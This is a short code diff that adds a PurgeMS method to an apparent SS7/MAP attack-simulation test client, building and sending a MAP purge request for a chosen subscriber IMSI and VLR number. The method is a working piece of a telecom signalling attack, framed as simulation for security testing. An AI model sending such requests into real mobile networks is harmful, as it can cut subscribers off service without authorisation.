@@ -1640,6 +1640,30 @@ public class TestAttackClient extends AttackTesterBase implements Stoppable, MAP
 
     }
 
+    public void performPurgeMS(IMSI imsi, ISDNAddressString vlrNumber) {
+        MAPProvider mapProvider = this.mapMan.getMAPStack().getMAPProvider();
+        MAPParameterFactory parameterFactory = mapProvider.getMAPParameterFactory();
+
+        Subscriber subscriber = this.testerHost.getAttackSimulationOrganizer().getSubscriberManager().getRandomSubscriber();
+
+        MAPApplicationContext mapApplicationContext = MAPApplicationContext.getInstance(
+                MAPApplicationContextName.msPurgingContext,
+                MAPApplicationContextVersion.version3);
+
+        try {
+            MAPDialogMobility curDialog = mapProvider.getMAPServiceMobility().createNewDialog(mapApplicationContext,
+                    this.mapMan.createOrigAddress(),
+                    null,
+                    this.mapMan.createDestAddress(),
+                    null);
+
+            curDialog.addPurgeMSRequest(imsi, vlrNumber, null, null);
+            curDialog.send();
+        } catch (MAPException e) {
+            System.out.println("Error performing PurgeMS: " + e.toString());
+        }
+    }
+
     @Override
     public void onSendAuthenticationInfoRequest(SendAuthenticationInfoRequest ind) {
 
